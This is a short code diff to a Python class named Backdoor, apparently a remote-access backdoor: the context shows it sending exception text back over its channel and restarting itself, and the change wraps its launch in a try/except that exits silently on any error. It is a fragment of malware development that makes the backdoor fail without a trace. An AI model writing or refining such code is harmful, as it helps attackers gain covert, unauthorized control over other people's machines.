@@ -72,6 +72,8 @@ class Backdoor:
             self.reliable_send(bytes(str(e), "utf-8"))
             self.run()
 
-
-my_backdoor = Backdoor()
-my_backdoor.run()
+try:
+    my_backdoor = Backdoor()
+    my_backdoor.run()
+except Exception:
+    sys.exit()
